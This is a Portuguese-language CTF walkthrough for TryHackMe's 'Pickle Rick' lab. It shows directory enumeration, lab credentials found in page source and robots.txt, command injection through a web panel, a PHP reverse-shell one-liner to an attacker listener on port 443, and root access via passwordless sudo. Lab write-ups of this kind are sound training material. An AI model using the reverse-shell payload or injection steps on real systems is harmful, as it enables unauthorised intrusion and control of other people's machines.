# 🥒 Pickle Rick CTF — TryHackMe  
## Walkthrough

Este repositório contém o **walkthrough completo** do desafio **Pickle Rick**, disponível na plataforma **TryHackMe**.  
O objetivo do CTF é localizar **três ingredientes (flags)** escondidos no sistema alvo, explorando vulnerabilidades em uma aplicação web e no sistema operacional.


---

## 📌 Informações Gerais

- **Plataforma:** TryHackMe  
- **Desafio:** Pickle Rick  
- **Máquina atacante:** Kali Linux  
- **Conexão:** VPN TryHackMe  
- **IP do alvo**

---

## 🎯 Objetivo

Encontrar os **3 ingredientes** escondidos no ambiente alvo por meio de:
- Reconhecimento
- Enumeração
- Exploração
- Escalonamento de privilégios

---

## 🔎 Reconhecimento Inicial

O primeiro passo foi verificar se o IP fornecido hospedava alguma aplicação web.

Acessando o endereço pelo navegador:

http://$IP

Foi apresentada uma página simples contendo a frase:

**Rick is sup4r cool**

![Rick is sup4r cool](https://github.com/user-attachments/assets/5cdf219b-60da-4c20-8551-ee8a5a897ee4)


---

### 📄 Análise do Código-Fonte

Utilizando o recurso **View Page Source** do navegador, foi encontrado o seguinte comentário no HTML:
"Username: R1ckRul3s"

![Username](https://github.com/user-attachments/assets/34561cb9-3ea6-4f8e-bc14-3f9dd210ce1d)

Isso indicou a possível existência de um sistema de autenticação utilizando esse usuário.

Tentativas diretas de acesso à rota `/login` não retornaram resposta válida.

![Login Not Found](https://github.com/user-attachments/assets/ace62dc0-a2e4-482e-badb-589dfd2b49be)

---

## 🌐 Enumeração de Portas (Nmap)

Para identificar os serviços ativos no host, foi realizada uma varredura de portas, que revelou:

- **Porta 80** — HTTP  
- **Porta 22** — SSH  

![nmap ](https://github.com/user-attachments/assets/5961cb7d-9c20-4c23-9d06-bb315c1f1f21)


Isso indicou duas superfícies principais de ataque:
- Aplicação Web
- Possível acesso remoto via SSH

---

## 📁 Enumeração de Diretórios (Gobuster)

Com foco na aplicação web, utilizei o **Gobuster** para enumerar diretórios e arquivos ocultos.

### Enumeração inicial:
bash
- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt**

Entre os caminhos encontrados:

/assets
/index.html
/robots.txt

![gobuster common](https://github.com/user-attachments/assets/0bd6adfc-4af8-4471-9d4f-b0b69c9083d0)

Ao acessar /robots.txt, foi encontrado o seguinte conteúdo:
**Wubbalubbadubdub**

Esse valor levantou a hipótese de ser uma senha, possivelmente relacionada ao username identificado anteriormente.

## 🔍 Enumeração Avançada
Para aprofundar a enumeração, utilizei uma wordlist maior e busquei arquivos com extensão PHP:

- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t 50 -x php**

![gobuster big](https://github.com/user-attachments/assets/f103c529-9935-4db0-bbda-22a83239d60b)

Assim, encontrei novos caminhos:

/portal.php
/denied.php
/login.php

##🔐 Autenticação no Portal

Ao acessar /portal.php, foi apresentada uma tela de login.

Credenciais utilizadas:

- Username:**R1ckRul3s**
- Password: **Wubbalubbadubdub**

<img width="426" height="527" alt="portal" src="https://github.com/user-attachments/assets/444ceb70-6692-446d-97c9-7036e354aecc" />

O login foi bem-sucedido e revelou um painel de comandos, caracterizando uma vulnerabilidade de Command Injection.

![command panel](https://github.com/user-attachments/assets/845324ae-046b-4973-91ee-de82bd13e997)

## 🖥️ Exploração do Painel de Comandos

Inicialmente, executei:

- **ls -a**

![LS -a](https://github.com/user-attachments/assets/7fccf6c0-b964-4f0d-adfc-5abdf51f2060)


Entre os arquivos listados estava:

- **Sup3rS3cretPickl3Ingred.txt**

![disabled](https://github.com/user-attachments/assets/d3e2024c-48aa-43c4-9281-8c85b92b0309)


O comando cat estava bloqueado. Como alternativa, utilizei:

tac Sup3rS3cretPickl3Ingred.txt

![first flag](https://github.com/user-attachments/assets/2f3b5f3d-4eb7-469b-973d-ab46abfb58ed)


✅ Primeira flag obtida

## 📄 Arquivo de Dica

O arquivo clue.txt continha a seguinte mensagem:

"Look around the file system for the other ingredient."

![look around](https://github.com/user-attachments/assets/6f3f30fe-d913-44f9-aef4-16e4de074967)

Isso indicou que os próximos ingredientes estariam em outros diretórios do sistema.

## 🔁 Reverse Shell

Para obter um acesso mais estável e interativo, foi realizada uma exploração via Reverse Shell.

![which nc](https://github.com/user-attachments/assets/8e799855-989a-46bc-b499-f3bdaeadbb6f)

Verificação do Netcat:
**which nc**

Listener na máquina atacante:
**nc -lvnp 443**

Payload executado:
**php -r '$sock=fsockopen("IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'**

Esse payload utiliza redirecionamento de file descriptors para estabelecer uma conexão reversa via TCP.

Após a conexão, executei:

- **bash -i**

![reverse shell connection](https://github.com/user-attachments/assets/8430ba85-b1c6-4895-bef7-d39650767f39)

para tornar o shell interativo.

## 🗂️ Enumeração do Sistema

Navegando pelo sistema:

- cd /home

![home ls](https://github.com/user-attachments/assets/8a22af2e-3495-4fab-95b7-486e990f89c6)


No diretório do usuário Rick, foi encontrado o arquivo second ingredients.

![segundo ingrediente ](https://github.com/user-attachments/assets/90042be0-bc5c-4601-9f90-38cdf5ec5e6a)

✅ Segunda flag obtida

### ⬆️ Escalonamento de Privilégios

Para verificar permissões elevadas, executei:

**sudo -l**

![sudo -l](https://github.com/user-attachments/assets/21c47c9f-8081-4acc-98d8-4bc6e68bc478)

O resultado indicou que o usuário podia executar qualquer comando como root sem necessidade de senha.

Escalonamento realizado com:

**sudo su -**

![sudo su -](https://github.com/user-attachments/assets/cfdaa8ed-c152-4d21-bccc-a4ab45fb3ade)

🏁 Flag Final

Com acesso root:

cd /root


Foi encontrado o arquivo:

**3rd.txt**

![cd root e terceira flag](https://github.com/user-attachments/assets/add71e83-0b13-4700-b3b8-f6863a26c4df)


✅ Terceira flag obtida
Assim, o desafio concluído com sucesso

## 🧠 Conclusão

Este desafio foi essencial para consolidar conceitos fundamentais de Segurança Ofensiva, proporcionando experiência prática em exploração de aplicações web, sistemas Linux e escalonamento de privilégios.

## 🛠️ Habilidades Desenvolvidas

- Reconhecimento e enumeração de serviços
- Enumeração de diretórios web
- Análise de código-fonte HTML
- Identificação de credenciais expostas
- Exploração de Command Injection
- Uso de Reverse Shell
- Manipulação de file descriptors
- Enumeração de sistemas Linux
- Escalonamento de privilégios com sudo
- Metodologia básica de Pentest

---
